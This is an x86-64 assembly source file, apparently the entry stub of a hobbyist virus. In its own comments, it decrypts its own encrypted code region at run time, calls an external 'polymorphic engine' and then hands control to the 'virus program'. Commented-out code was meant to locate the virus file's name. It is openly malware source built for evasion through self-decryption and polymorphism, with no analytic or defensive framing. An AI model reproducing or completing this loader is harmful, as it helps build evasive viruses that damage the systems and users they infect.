%include "template.asm.inc"
extern main
extern polymorphicengine
; Define variables in the data section
section .data
	hello:     db 'Hello world!',10
	helloLen:  equ $-hello

; Code goes in the text section
section .text
	global _start

align 16
_start:             ; Global entry point


	;; this is undone, it gets the name of the virus file, for now ill hardcode the virus name in c program
    ; mov rax, 1           
    ; mov rdi, 1         
    ; mov rsi, [rsp+8]
    ; mov rdx, 5          
    ; syscall

	; ; save current state on stack
	; push rsp
	; push rdi
	; push rsi
    ; call decrypt

	; ; reload the initial program, state
	; pop rsi
	; pop rdi
	; pop rsp

    ; mov rax, 1           
    ; mov rdi, 1         
    ; mov rsi, [rsp+8]
    ; mov rdx, 5          
    ; syscall

	; ; save current state on stack
	; push rsp
	; push rdi
	; push rsi
	mov rbx, rsp 
	mov r14, rdi
	mov r15, rsi

	call decrypt

	mov rsp, rbx 
	mov rdi, r14
	mov rsi, r15


	; call polymorph engine
	xor rbp, rbp
	pop rdi
	mov rsi, rsp
	lea rdx, [rsp+rdi+8*8]
	push rdi
	call polymorphicengine
	
	; reload the initial program, state
	mov rsp, rbx 
	mov rdi, r14
	mov rsi, r15

	; call the external virus program
	xor rbp, rbp
	pop rdi
	mov rsi, rsp
	lea rdx, [rsp+rdi+8*8]
	push rdi
	call main
	mov rdi, rax
	mov eax, 1
	int 80h



decrypt:
	; there is automatic calculation happening inside DECRYPTOR_SECTION function which is (_start-main) == xxxh worth of memory that will be encrypted/decrypted
    DECRYPTOR_SECTION main, _start
    ret